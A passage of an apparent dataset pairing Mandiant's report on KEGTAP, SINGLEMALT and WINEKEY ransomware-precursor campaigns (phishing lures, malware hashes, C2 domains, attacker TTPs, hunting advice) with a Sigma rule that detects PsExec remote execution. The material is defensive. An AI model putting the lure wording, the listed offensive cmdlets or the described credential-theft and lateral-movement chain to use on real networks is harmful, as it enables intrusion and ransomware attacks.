suspension notice\n- Contract cancellation reminder\n- FW: `<Name>` Annual Bonus Report is Ready\n- RE: `<(first|last)-name>`: Your Payslip for October\n- RE: `<Company Name>` Employee Survey\n- RE: `<Name>` termination list\n- RE: `<Company Name>` office\n- RE: Urgent `<Company Name>` Employee Internal Survey\n- RE: Working schedule adjustment\n- RE: Your Payslip for September\n\n### Example Malware Family MD5s\n\n- **KEGTAP**\n  - `df00d1192451268c31c1f8568d1ff472`\n- **BEERBOT**\n  - `6c6a2bfa5846fab374b2b97e65095ec9`\n- **SINGLEMALT**\n  - `37aa5690094cb6d638d0f13851be4246`\n- **STILLBOT**\n  - `3176c4a2755ae00f4fffe079608c7b25`\n- **WINEKEY**\n  - `9301564bdd572b0773f105287d8837c4`\n- **CORKBOT**\n  - `0796f1c1ea0a142fc1eb7109a44c86cb`\n\n### Code Signing Certificate CNs\n\n- ARTBUD RADOM SP Z O O\n- BESPOKE SOFTWARE SOLUTIONS LIMITED\n- Best Fud, OOO\n- BlueMarble GmbH\n- CHOO FSP, LLC\n- Company Megacom SP Z O O\n- ESTELLA, OOO\n- EXON RENTAL SP Z O O\n- Geksan LLC\n- GLOBAL PARK HORIZON SP Z O O\n- Infinite Programming Limited\n- James LTH d.o.o.\n- Logika OOO\n- MADAS d.o.o.\n- MUSTER PLUS SP Z O O\n- NEEDCODE SP Z O O\n- Nordkod LLC\n- NOSOV SP Z O O\n- OOO MEP\n- PLAN CORP PTY LTD\n- REGION TOURISM LLC\n- RESURS-RM OOO\n- Retalit LLC\n- Rumikon LLC\n- SNAB-RESURS, OOO\n- TARAT d.o.o.\n- TES LOGISTIKA d.o.o.\n- VAS CO PTY LTD\n- VB CORPORATE PTY. LTD.\n- VITA-DE d.o.o.\n\n## UNC1878 Indicators\n\nA significant proportion of the post-compromise activity associated with these campaigns has involved the distribution of RYUK ransomware by a threat group tracked by Mandiant as UNC1878. As such, we are releasing indicators associated with this group.\n\n### BEACON C2s\n\n| First Seen | Domain                         |\n| ---------- | ------------------------------ |\n| 12/11/19   | updatemanagir[.]us             |\n| 12/20/19   | cmdupdatewin[.]com             |\n| 12/26/19   | scrservallinst[.]info          |\n| 1/10/20    | winsystemupdate[.]com          |\n| 1/11/20    | jomamba[.]best                 |\n| 1/13/20    | updatewinlsass[.]com           |\n| 1/16/20    | winsysteminfo[.]com            |\n| 1/20/20    | livecheckpointsrs[.]com        |\n| 1/21/20    | ciscocheckapi[.]com            |\n| 1/28/20    | timesshifts[.]com              |\n| 1/29/20    | cylenceprotect[.]com           |\n| 1/30/20    | sophosdefence[.]com            |\n| 1/30/20    | taskshedulewin[.]com           |\n| 1/30/20    | windefenceinfo[.]com           |\n| 1/30/20    | lsasswininfo[.]com             |\n| 1/30/20    | update-wind[.]com              |\n| 1/30/20    | lsassupdate[.]com              |\n| 1/30/20    | renovatesystem[.]com           |\n| 1/31/20    | updatewinsoftr[.]com           |\n| 2/2/20     | cleardefencewin[.]com          |\n| 2/2/20     | checkwinupdate[.]com           |\n| 2/2/20     | havesetup[.]net                |\n| 2/3/20     | update-wins[.]com              |\n| 2/3/20     | conhostservice[.]com           |\n| 2/4/20     | microsoftupdateswin[.]com      |\n| 2/4/20     | iexploreservice[.]com          |\n| 2/12/20    | avrenew[.]com                  |\n| 2/12/20    | target-support[.]online        |\n| 2/12/20    | web-analysis[.]live            |\n| 2/14/20    | freeallsafe[.]com              |\n| 2/17/20    | windefens[.]com                |\n| 2/17/20    | defenswin[.]com                |\n| 2/17/20    | easytus[.]com                  |\n| 2/17/20    | greattus[.]com                 |\n| 2/17/20    | livetus[.]com                  |\n| 2/17/20    | comssite[.]com                 |\n| 2/17/20    | findtus[.]com                  |\n| 2/17/20    | bigtus[.]com                   |\n| 2/17/20    | aaatus[.]com                   |\n| 2/17/20    | besttus[.]com                  |\n| 2/17/20    | firsttus[.]com                 |\n| 2/17/20    | worldtus[.]com                 |\n| 2/26/20    | freeoldsafe[.]com              |\n| 2/26/20    | serviceupdates[.]net           |\n| 2/26/20    | topserviceupdater[.]com        |\n| 2/27/20    | myserviceupdater[.]com         |\n| 2/29/20    | myservicebooster[.]net         |\n| 2/29/20    | servicesbooster[.]org          |\n| 2/29/20    | brainschampions[.]com          |\n| 2/29/20    | myservicebooster[.]com         |\n| 2/29/20    | topservicesbooster[.]com       |\n| 2/29/20    | servicesbooster[.]com          |\n| 2/29/20    | topservicesecurity[.]org       |\n| 2/29/20    | topservicesecurity[.]net       |\n| 2/29/20    | topsecurityservice[.]net       |\n| 2/29/20    | myyserviceupdater[.]com        |\n| 2/29/20    | topservicesupdate[.]com        |\n| 2/29/20    | topservicesecurity[.]com       |\n| 2/29/20    | servicesecurity[.]org          |\n| 2/29/20    | myserviceconnect[.]net         |\n| 3/2/20     | topservicesupdates[.]com       |\n| 3/2/20     | yoursuperservice[.]com         |\n| 3/2/20     | topservicehelper[.]com         |\n| 3/2/20     | serviceuphelper[.]com          |\n| 3/2/20     | serviceshelpers[.]com          |\n| 3/2/20     | boostsecuritys[.]com           |\n| 3/3/20     | hakunamatatata[.]com           |\n| 3/8/20     | service-updater[.]com          |\n| 3/9/20     | secondserviceupdater[.]com     |\n| 3/9/20     | twelvethserviceupdater[.]com   |\n| 3/9/20     | twentiethservicehelper[.]com   |\n| 3/9/20     | twelfthservicehelper[.]com     |\n| 3/9/20     | tenthservicehelper[.]com       |\n| 3/9/20     | thirdserviceupdater[.]com      |\n| 3/9/20     | thirdservicehelper[.]com       |\n| 3/9/20     | tenthserviceupdater[.]com      |\n| 3/9/20     | thirteenthservicehelper[.]com  |\n| 3/9/20     | seventeenthservicehelper[.]com |\n| 3/9/20     | sixteenthservicehelper[.]com   |\n| 3/9/20     | sixthservicehelper[.]com       |\n| 3/9/20     | seventhservicehelper[.]com     |\n| 3/9/20     | seventhserviceupdater[.]com    |\n| 3/9/20     | sixthserviceupdater[.]com      |\n| 3/9/20     | secondservicehelper[.]com      |\n| 3/9/20     | ninthservicehelper[.]com       |\n| 3/9/20     | ninethserviceupdater[.]com     |\n| 3/9/20     | fourteenthservicehelper[.]com  |\n| 3/9/20     | fourthserviceupdater[.]com     |\n| 3/9/20     | firstserviceupdater[.]com      |\n| 3/9/20     | firstservisehelper[.]com       |\n| 3/9/20     | fifthserviceupdater[.]com      |\n| 3/9/20     | eleventhserviceupdater[.]com   |\n| 3/9/20     | fifthservicehelper[.]com       |\n| 3/9/20     | fourservicehelper[.]com        |\n| 3/9/20     | eighthservicehelper[.]com      |\n| 3/9/20     | eighteenthservicehelper[.]com  |\n| 3/9/20     | eighthserviceupdater[.]com     |\n| 3/9/20     | fifteenthservicehelper[.]com   |\n| 3/9/20     | nineteenthservicehelper[.]com  |\n| 3/9/20     | eleventhservicehelper[.]com    |\n| 3/14/20    | thirdservice-developer[.]com   |\n| 3/14/20    | fifthservice-developer[.]com   |\n| 3/15/20    | firstservice-developer[.]com   |\n| 3/16/20    | fourthservice-developer[.]com  |\n| 3/16/20    | ninethservice-developer[.]com  |\n| 3/16/20    | seventhservice-developer[.]com |\n| 3/16/20    | secondservice-developer[.]com  |\n| 3/16/20    | sixthservice-developer[.]com   |\n| 3/16/20    | tenthservice-developer[.]com   |\n| 3/16/20    | eithtservice-developer[.]com   |\n| 3/17/20    | servicedupdater[.]com          |\n| 3/17/20    | service-updateer[.]com         |\n| 3/19/20    | sexyservicee[.]com             |\n| 3/19/20    | serviceboostnumberone[.]com    |\n| 3/19/20    | servicedbooster[.]com          |\n| 3/19/20    | service-hunter[.]com           |\n| 3/19/20    | servicedhunter[.]com           |\n| 3/19/20    | servicedpower[.]com            |\n| 3/19/20    | sexycservice[.]com             |\n| 3/23/20    | yourserviceupdater[.]com       |\n| 3/23/20    | top-serviceupdater[.]com       |\n| 3/23/20    | top-servicebooster[.]com       |\n| 3/23/20    | serviceshelps[.]com            |\n| 3/23/20    | servicemonsterr[.]com          |\n| 3/23/20    | servicehunterr[.]com           |\n| 3/23/20    | service-helpes[.]com           |\n| 3/23/20    | servicecheckerr[.]com          |\n| 3/23/20    | newservicehelper[.]com         |\n| 3/23/20    | huntersservice[.]com           |\n| 3/23/20    | helpforyourservice[.]com       |\n| 3/23/20    | boostyourservice[.]com         |\n| 3/26/20    | developmasters[.]com           |\n| 3/26/20    | actionshunter[.]com            |\n| 5/4/20     | info-develop[.]com             |\n| 5/4/20     | ayechecker[.]com               |\n| 5/4/20     | service-booster[.]com          |\n| 9/18/20    | zapored[.]com                  |\n| 9/22/20    | gtrsqer[.]com                  |\n| 9/22/20    | chalengges[.]com               |\n| 9/22/20    | caonimas[.]com                 |\n| 9/22/20    | hakunaman[.]com                |\n| 9/22/20    | getinformationss[.]com         |\n| 9/22/20    | nomadfunclub[.]com             |\n| 9/22/20    | harddagger[.]com               |\n| 9/22/20    | errvghu[.]com                  |\n| 9/22/20    | reginds[.]com                  |\n| 9/22/20    | gameleaderr[.]com              |\n| 9/22/20    | razorses[.]com                 |\n| 9/22/20    | vnuret[.]com                   |\n| 9/22/20    | regbed[.]com                   |\n| 9/22/20    | bouths[.]com                   |\n| 9/23/20    | ayiyas[.]com                   |\n| 9/23/20    | serviceswork[.]net             |\n| 9/23/20    | moonshardd[.]com               |\n| 9/23/20    | hurrypotter[.]com              |\n| 9/23/20    | biliyilish[.]com               |\n| 9/23/20    | blackhoall[.]com               |\n| 9/23/20    | checkhunterr[.]com             |\n| 9/23/20    | daggerclip[.]com               |\n| 9/23/20    | check4list[.]com               |\n| 9/24/20    | chainnss[.]com                 |\n| 9/29/20    | hungrrybaby[.]com              |\n| 9/30/20    | martahzz[.]com                 |\n| 10/1/20    | jonsonsbabyy[.]com             |\n| 10/1/20    | wondergodst[.]com              |\n| 10/1/20    | zetrexx[.]com                  |\n| 10/1/20    | tiancaii[.]com                 |\n| 10/1/20    | cantliee[.]com                 |\n| 10/1/20    | realgamess[.]com               |\n| 10/1/20    | maybebaybe[.]com               |\n| 10/1/20    | saynoforbubble[.]com           |\n| 10/1/20    | chekingking[.]com              |\n| 10/1/20    | rapirasa[.]com                 |\n| 10/1/20    | raidbossa[.]com                |\n| 10/1/20    | mountasd[.]com                 |\n| 10/1/20    | puckhunterrr[.]com             |\n| 10/1/20    | pudgeee[.]com                  |\n| 10/1/20    | loockfinderrs[.]com            |\n| 10/1/20    | lindasak[.]com                 |\n| 10/1/20    | bithunterr[.]com               |\n| 10/1/20    | voiddas[.]com                  |\n| 10/1/20    | sibalsakie[.]com               |\n| 10/1/20    | giveasees[.]com                |\n| 10/1/20    | shabihere[.]com                |\n| 10/1/20    | tarhungangster[.]com           |\n| 10/1/20    | imagodd[.]com                  |\n| 10/1/20    | raaidboss[.]com                |\n| 10/1/20    | sunofgodd[.]com                |\n| 10/1/20    | rulemonster[.]com              |\n| 10/1/20    | loxliver[.]com                 |\n| 10/1/20    | servicegungster[.]com          |\n| 10/1/20    | kungfupandasa[.]com            |\n| 10/2/20    | check1domains[.]com            |\n| 10/5/20    | sweetmonsterr[.]com            |\n| 10/5/20    | qascker[.]com                  |\n| 10/7/20    | remotessa[.]com                |\n| 10/7/20    | cheapshhot[.]com               |\n| 10/7/20    | havemosts[.]com                |\n| 10/7/20    | unlockwsa[.]com                |\n| 10/7/20    | sobcase[.]com                  |\n| 10/7/20    | zhameharden[.]com              |\n| 10/7/20    | mixunderax[.]com               |\n| 10/7/20    | bugsbunnyy[.]com               |\n| 10/7/20    | fastbloodhunter[.]com          |\n| 10/7/20    | serviceboosterr[.]com          |\n| 10/7/20    | servicewikii[.]com             |\n| 10/7/20    | secondlivve[.]com              |\n| 10/7/20    | quwasd[.]com                   |\n| 10/7/20    | luckyhunterrs[.]com            |\n| 10/7/20    | wodemayaa[.]com                |\n| 10/7/20    | hybriqdjs[.]com                |\n| 10/7/20    | gunsdrag[.]com                 |\n| 10/7/20    | gungameon[.]com                |\n| 10/7/20    | servicemount[.]com             |\n| 10/7/20    | servicesupdater[.]com          |\n| 10/7/20    | service-boosterr[.]com         |\n| 10/7/20    | serviceupdatter[.]com          |\n| 10/7/20    | dotmaingame[.]com              |\n| 10/12/20   | backup1service[.]com           |\n| 10/13/20   | bakcup-monster[.]com           |\n| 10/13/20   | bakcup-checker[.]com           |\n| 10/13/20   | backup-simple[.]com            |\n| 10/13/20   | backup-leader[.]com            |\n| 10/13/20   | backup-helper[.]com            |\n| 10/13/20   | service-checker[.]com          |\n| 10/13/20   | nasmastrservice[.]com          |\n| 10/14/20   | service-leader[.]com           |\n| 10/14/20   | nas-simple-helper[.]com        |\n| 10/14/20   | nas-leader[.]com               |\n| 10/14/20   | boost-servicess[.]com          |\n| 10/14/20   | elephantdrrive[.]com           |\n| 10/15/20   | service-hellper[.]com          |\n| 10/16/20   | top-backuphelper[.]com         |\n| 10/16/20   | best-nas[.]com                 |\n| 10/16/20   | top-backupservice[.]com        |\n| 10/16/20   | bestservicehelper[.]com        |\n| 10/16/20   | backupnas1[.]com               |\n| 10/16/20   | backupmastter[.]com            |\n| 10/16/20   | best-backup[.]com              |\n| 10/17/20   | viewdrivers[.]com              |\n| 10/19/20   | topservicebooster[.]com        |\n| 10/19/20   | topservice-masters[.]com       |\n| 10/19/20   | topbackupintheworld[.]com      |\n| 10/19/20   | topbackup-helper[.]com         |\n| 10/19/20   | simple-backupbooster[.]com     |\n| 10/19/20   | top3-services[.]com            |\n| 10/19/20   | backup1services[.]com          |\n| 10/21/20   | backupmaster-service[.]com     |\n| 10/21/20   | backupmasterservice[.]com      |\n| 10/21/20   | service1updater[.]com          |\n| 10/21/20   | driverdwl[.]com                |\n| 10/21/20   | backup1master[.]com            |\n| 10/21/20   | boost-yourservice[.]com        |\n| 10/21/20   | checktodrivers[.]com           |\n| 10/21/20   | backup1helper[.]com            |\n| 10/21/20   | driver1updater[.]com           |\n| 10/21/20   | driver1master[.]com            |\n| 10/23/20   | view-backup[.]com              |\n| 10/23/20   | top3servicebooster[.]com       |\n| 10/23/20   | servicereader[.]com            |\n| 10/23/20   | servicehel[.]com               |\n| 10/23/20   | driver-boosters[.]com          |\n| 10/23/20   | service1update[.]com           |\n| 10/23/20   | service-hel[.]com              |\n| 10/23/20   | driver1downloads[.]com         |\n| 10/23/20   | service1view[.]com             |\n| 10/23/20   | backups1helper[.]com           |\n| 10/25/20   | idriveview[.]com               |\n| 10/26/20   | debug-service[.]com            |\n| 10/26/20   | idrivedwn[.]com                |\n| 10/28/20   | driverjumper[.]com             |\n| 10/28/20   | service1boost[.]com            |\n| 10/28/20   | idriveupdate[.]com             |\n| 10/28/20   | idrivehepler[.]com             |\n| 10/28/20   | idrivefinder[.]com             |\n| 10/28/20   | idrivecheck[.]com              |\n| 10/28/20   | idrivedownload[.]com           |\n\n---\n\nPosted in Threat Intelligence, Security & Identity",
    "sigma_rule": {
      "title": "Potential PsExec Remote Execution",
      "id": "ea011323-7045-460b-b2d7-0f7442ea6b38",
      "status": "test",
      "description": "Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-28",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "accepteula",
            " -u ",
            " -p ",
            " \\\\\\\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psexec_remote_execution.yml",
    "id": "588"
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser\n\n**October 28, 2020**\n\n---\n\nThroughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat.\n\nThe malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these malware families communicate with the same command and control infrastructure (C2) and are close to functional parity, there are minimal code overlaps across them. Other security researchers have tracked these malware families under the names BazarLoader and BazarBackdoor or Team9.\n\nThe operators conducting these campaigns have actively targeted hospitals, retirement communities, and medical centers, even in the midst of a global health crisis, demonstrating a clear disregard for human life.\n\n## Email Campaign TTPs\n\nCampaigns distributing KEGTAP, SINGLEMALT, and WINEKEY have been sent to individuals at organizations across a broad range of industries and geographies using a series of shifting delivery tactics, techniques, and procedures (TTPs). Despite the frequent changes seen across these campaigns, the following has remained consistent across recent activity:\n\n- Emails contain an in-line link to an actor-controlled Google Docs document, typically a PDF file.\n- This document contains an in-line link to a URL hosting a malware payload.\n- Emails masquerade as generic corporate communications, including follow-ups about documents and phone calls or emails crafted to appear related to complaints, terminations, bonuses, contracts, working schedules, surveys, or queries about business hours.\n- Some email communications have included the recipient’s name or employer name in the subject line and/or email body.\n\nDespite this uniformity, the associated TTPs have otherwise changed regularly—both between campaigns and across multiple spam runs seen in the same day. Notable ways that these campaigns have varied over time include:\n\n- Early campaigns were delivered via Sendgrid and included in-line links to Sendgrid URLs that would redirect users to attacker-created Google documents. In contrast, recent campaigns have been delivered via attacker-controlled or compromised email infrastructure and have commonly contained in-line links to attacker-created Google documents, although they have also used links associated with the Constant Contact service.\n- The documents loaded by these in-line links are crafted to appear somewhat relevant to the theme of the email campaign and contain additional links along with instructions directing users to click on them. When clicked, these links download malware binaries with file names masquerading as document files. Across earlier campaigns, these malware binaries were hosted on compromised infrastructure; however, the attackers have shifted to hosting their malware on legitimate web services, including Google Drive, Basecamp, Slack, Trello, Yougile, and JetBrains.\n- In recent campaigns, the malware payloads have been hosted on numerous URLs associated with one or more of these legitimate services. In cases where the payloads have been taken down, the actors have sometimes updated their Google documents to contain new, working links.\n- Some campaigns have also incorporated customization, including emails with internal references to the recipients’ organizations and organizations’ logos embedded into the Google Docs documents.\n\n```image\nAlt: Figure 1: Email containing internal references to target an organization’s name\nDescription: The image depicts a screenshot of an email titled 'Contract cancellation reminder.' The email appears to be crafted to resemble a legitimate corporate communication, with a greeting and a message informing the recipient that a contract with their company is temporarily suspended. It includes a link to a Google Docs document, which is likely intended to download malware when clicked. The email uses an official-sounding sender name, 'Bethanne Wesley,' and features a professional layout, making it seem credible to the recipient.\nTranscription: |\n  Contract cancellation reminder\n  \n  From: Bethanne Wesley <andrew.constantine@littlernews.mobi>\n  Date: Today at 11:42 AM\n  \n  Good day to you, [REDACTED]!\n  Unfortunately, we are here to tell you that our contract with [REDACTED] company is temporarily suspended because of the riots on the factory house. Payments compensation info and contract you can find here:\n  https://docs.google.com/document/d/e/2PACX-1vTX6R2anNzKGbShQGLLz_U7DvhhakDw3kOO3b6-0Gr1w6BmDwmFsXM994WAnmptW4D17wANH7l_2/pub\n  \n  We are sorry for such troubles.\n  \n  Regards,\n  Bethanne Wesley\n```\n\n```image\nAlt: Figure 2: Google Docs PDF document containing a target organization’s logo\nDescription: The image depicts a Google Drive document labeled 'Termination List.PDF' featuring a preview for a document with the title 'Termination List #49376-22/10'. A blue button labeled 'START' is prominently displayed, indicating that users can click to download the document. The message suggests that the document is ready for preview and provides instructions for downloading, emphasizing that the preview is available only on desktop computers. This layout is typical of phishing attempts, which often use such tactics to lure users into downloading malicious payloads.\nTranscription: |\n  Termination List.PDF\n  Updated automatically every 5 minutes\n  \n  Termination List #49376-22/10\n  Termination List #49376-22/10 is ready to preview. If downloading doesn't start automatically, click the buttons below.\n  \n  [START]\n  \n  Preview is available only on desktop computers.\n  \n  Published by Google Drive – Report Abuse\n```\n\nHiding the final payload behind multiple links is a simple yet effective way to bypass some email filtering technologies. Various technologies have the ability to follow links in an email to try to identify malware or malicious domains; however, the number of links followed can vary. Additionally, embedding links within a PDF document further makes automated detection and link-following difficult.\n\n## Post-Compromise TTPs\n\nGiven the possibility that accesses obtained from these campaigns may be provided to various operators to monetize, the latter-stage TTPs, including ransomware family deployed, may vary across intrusions. A notable majority of cases where Mandiant has had visibility into these post-compromise TTPs have been attributable to UNC1878, a financially motivated actor that monetizes network access via the deployment of RYUK ransomware.\n\n### Establish Foothold\n\nOnce the loader and backdoor have been executed on the initial victim host, the actors have used this initial backdoor to download POWERTRICK and/or Cobalt Strike BEACON payloads to establish a foothold. Notably, the respective loader and backdoor as well as POWERTRICK have typically been installed on a small number of hosts in observed incidents, suggesting these payloads may be reserved for establishing a foothold and performing initial network and host reconnaissance. However, BEACON is frequently found on a larger number of hosts and used throughout various stages of the attack lifecycle.\n\n### Maintain Presence\n\nBeyond the preliminary phases of each intrusion, we have seen variations in how these attackers have maintained presence after establishing an initial foothold or moving laterally within a network. In addition to the use of common post-exploitation frameworks such as Cobalt Strike, Metasploit, and EMPIRE, we have observed the use of other backdoors, including ANCHOR, that we also believe to be under control of the actors behind TrickBot.\n\n- The loaders associated with this activity can maintain persistence through reboot by using at least four different techniques, including creating a scheduled task, adding itself to the startup folder as a shortcut, creating a scheduled Microsoft BITS job using `/setnotifycmdline`, and adding itself to the Userinit value under the following registry key:\n  - `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`\n- Actors have downloaded POWERTRICK, Metasploit Meterpreter, and Cobalt Strike BEACON payloads following the initial compromise. BEACON payloads have commonly been executed after moving laterally to new hosts within the victim network. The attackers have employed Cobalt Strike payloads crafted to maintain persistence through reboot via a scheduled task on critical systems in victim environments. Notably, BEACON is the backdoor observed most frequently across these incidents.\n- We have observed actors executing encoded PowerShell commands that ultimately executed instances of the PowerShell EMPIRE backdoor.\n- The actors were observed using BEACON to execute PowerLurk's Register-MaliciousWmiEvent cmdlet to register WMI events used to kill processes related to security tools and utilities, including Task Manager, WireShark, TCPView, ProcDump, Process Explorer, Process Monitor, NetStat, PSLoggedOn, LogonSessions, Process Hacker, Autoruns, AutorunsSC, RegEdit, and RegShot.\n- In at least one case, attackers have maintained access to a victim environment using stolen credentials to access corporate VPN infrastructure configured to require only single-factor authentication.\n\n### Escalate Privileges\n\nThe most commonly observed methods for escalating privileges in these incidents have involved the use of valid credentials. The actors used a variety of techniques for accessing credentials stored in memory or on disk to access privileged accounts.\n\n- The actors used valid credentials obtained using MimiKatz variants to escalate privileges. We’ve observed Mimikatz being executed both from the file system of victim hosts and via PowerShell cmdlets executed via Cobalt Strike BEACON.\n- Actors have gained access to credentials via exported copies of the `ntds.dit` Active Directory database and SYSTEM and SECURITY registry hives from a Domain Controller.\n- In multiple instances, the actors have launched attacks against Kerberos, including the use of RUBEUS, the MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet.\n\n### Reconnaissance\n\nThe approaches taken to perform host and network reconnaissance across these incidents varied; however, a significant portion of observed reconnaissance activity has revolved around Activity Directory enumeration using publicly available utilities such as BLOODHOUND, SHARPHOUND, or ADFind, as well as the execution of PowerShell cmdlets using Cobalt Strike BEACON.\n\n- BEACON has been installed on a large number of systems across these intrusions and has been used to execute various reconnaissance commands including both built-in host commands and PowerShell cmdlets. Observed PowerShell cmdlets include:\n  - `Get-GPPPassword`\n  - `Invoke-AllChecks`\n  - `Invoke-BloodHound`\n  - `Invoke-EternalBlue`\n  - `Invoke-FileFinder`\n  - `Invoke-HostRecon`\n  - `Invoke-Inveigh`\n  - `Invoke-Kerberoast`\n  - `Invoke-LoginPrompt`\n  - `Invoke-mimikittenz`\n  - `Invoke-ShareFinder`\n  - `Invoke-UserHunter`\n- Mandiant has observed actors using POWERTRICK to execute built-in system commands on the initial victim host, including `ipconfig`, `findstr`, and `cmd.exe`.\n- The actors leveraged publicly available utilities Adfind, BLOODHOUND, SHARPHOUND, and KERBRUTE on victim networks to collect Active Directory information and credentials.\n- WMIC commands have been used to perform host reconnaissance, including listing installed software, listing running processes, and identifying operating system and system architecture.\n- The actors have used a batch script to ping all servers identified during Active Directory enumeration and output the results to `res.txt`.\n- The actors used the `Nltest` command to list domain controllers.\n\n### Lateral Movement\n\nLateral movement was most commonly accomplished using valid credentials in combination with Cobalt Strike BEACON, RDP, and SMB, or using the same backdoors used to establish a foothold in victim networks.\n\n- The actors have regularly leveraged Cobalt Strike BEACON and Metasploit Meterpreter to move laterally within victim environments.\n- The actors commonly moved laterally within victim environments using compromised accounts—both those belonging to regular users and accounts with administrative privileges. In addition to the use of common post-exploitation frameworks, lateral movement has also been achieved using WMIC commands and the Windows RDP and SMB protocols.\n- The actors used the Windows `net use` command to connect to Windows admin shares to move laterally.\n\n### Complete Mission\n\nMandiant is directly aware of incidents involving KEGTAP that included the post-compromise deployment of RYUK ransomware. We have also observed instances where ANCHOR infections, another backdoor associated with the same actors, preceded CONTI or MAZE deployment.\n\n- In at least one case, an executable was observed that was designed to exfiltrate files via SFTP to an attacker-controlled server.\n- The actors have used Cobalt Strike BEACON to exfiltrate data created through network reconnaissance activities as well as user files.\n- The actors were observed deleting their tools from victim hosts in an attempt to remove indicators of compromise.\n- The actors have used their access to the victim network to deploy ransomware payloads. There is evidence to suggest that RYUK ransomware was likely deployed via PsExec, but other scripts or artifacts related to the distribution process were not available for forensic analysis.\n\n## Hunting Strategies\n\nIf an organization identifies a host with an active infection believed to be an instance of KEGTAP or a parallel malware family, the following containment actions are recommended. Note that due to the velocity of this intrusion activity, these actions should be taken in parallel.\n\n- Isolate and perform a forensic review of any impacted systems.\n- Review incoming emails to the user that owns the impacted device for emails matching the distribution campaigns, and take action to remove the messages from all mailboxes.\n- Identify the URLs used by the phishing campaign and block them using proxy or network security devices.\n- Reset credentials for any user accounts associated with execution of the malware.\n- Perform an enterprise-wide review for lateral movement authentication from the impacted systems.\n- Check authentication logs from any single-factor remote access solutions that may exist (VPN, VDI, etc.) and move towards multi-factor authentication (MFA) as soon as possible.\n\nAn enterprise-wide effort should be made to identify host-based artifacts related to the execution of first-stage malware and all post-intrusion activity associated with this activity. Some baseline approaches to this have been captured as follows.\n\nActivity associated with the KEGTAP loader can often be identified via a review of system startup folders and Userinit values under the `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` registry key.\n\n```\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adobe.lnk\n```\n\n*Figure 3: Example LNK file associated with KEGTAP persistence within a system’s startup folders*\n\nSINGLEMALT employs BITS to maintain persistence through reboot and can often be identified via a review of anomalous BITS jobs. SINGLEMALT uses a well-documented BITS persistence mechanism that intentionally creates a job to download a non-existent URL, which will trigger a failure event. The job is set to retry on a regular interval, thus ensuring the malware continues to run. To review the BITS job on a host, run the command `bitsadmin /list`.\n\n- Display name may be “Adobe Update”, “System autoupdate” or another generic value.\n- Notify state may be set to Fail (Status 2).\n- FileList URL value may be set to the local host or a URL that does not exist.\n- The Notification Command Line value may contain the path to the SINGLEMALT sample and/or a command to move it to a new location then start it.\n- The Retry Delay value will be set.\n\nWINEKEY maintains persistence through reboot via the use of registry RUN keys. Searching for anomalous RUN keys enterprise-wide can help to identify systems impacted by this malware.\n\n```\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr\n\nValue: Path to the backdoor\n```\n\n*Figure 4: Example registry RUN key used by WINEKEY to maintain persistence*\n\nThe ANCHOR backdoor has been seen across a subset of intrusions associated with this activity and can often be identified via the scheduled tasks it uses to maintain persistence through reboot. The scheduled tasks created by ANCHOR are often unnamed, although that is not always the case.\n\n- The identification of named scheduled tasks associated with ANCHOR persistence may be constructed according to the following pattern: `<Random directory within %APPDATA%> autoupdate#<random number>`.\n- All unnamed scheduled tasks should be reviewed, particularly those with a creation date consistent with the time of the suspected compromise.\n\nAlthough it is a low fidelity indicator, ANCHOR activity may also sometimes be identified by searching for binaries within the `C:\\Windows\\SysWOW64` directory that have a file name matching the following pattern: `<8 random lowercase chars>.exe`. Stacking or sorting on file creation timestamps in the `C:\\Windows\\SysWOW64` directory may also help identify malicious files, as the directory should be mostly static.\n\nPost-exploitation activity associated with the deployment of ransomware following these campaigns is typically conducted using the Cobalt Strike attack framework. The BEACON payload associated with Cobalt Strike can often be identified via a review of existing registered services and service creation events (Event ID 7045), both markers of the mechanism it most commonly employs to maintain persistence.\n\nThe following are additional strategies that may aid in identifying associated activity:\n\n- Organizations can review web proxy logs in order to identify HXXP requests for file storage, project management, collaboration, or communication services with a referrer from a Google Docs document.\n- During the associated post-compromise activity, attackers have commonly staged their tools and data in the PerfLogs directory and C$ share.\n- While collecting data used to enable later-stage operations, the attackers commonly leave instances of `ntds.dit` and exports of the SYSTEM and SECURITY registry hives on impacted systems.\n\n## Hardening Strategies\n\nThe actions taken by the actors to escalate privileges and move laterally in an environment use well-documented techniques that search the network and Active Directory for common misconfigurations that expose credentials and systems for abuse. Organizations can take steps to limit the impact and effectiveness of these techniques. For more in-depth recommendations see our ransomware protection white paper.\n\n- Harden service accounts against brute force and password guessing attacks. Most organizations have at least a few service accounts with passwords set to never expire. These passwords are likely old and insecure. Make a best effort to reset as many of these accounts as possible to long and complex passwords. In cases where it is possible, migrate to MSAs and gMSAS for automated rotation.\n- Prevent the usage of privileged accounts for lateral movement. Use GPOs to restrict the ability for privileged accounts such as Domain Administrators and privileged service accounts from initiating RDP connections and network logins. Actors often pick just a few accounts to use for RDP; by 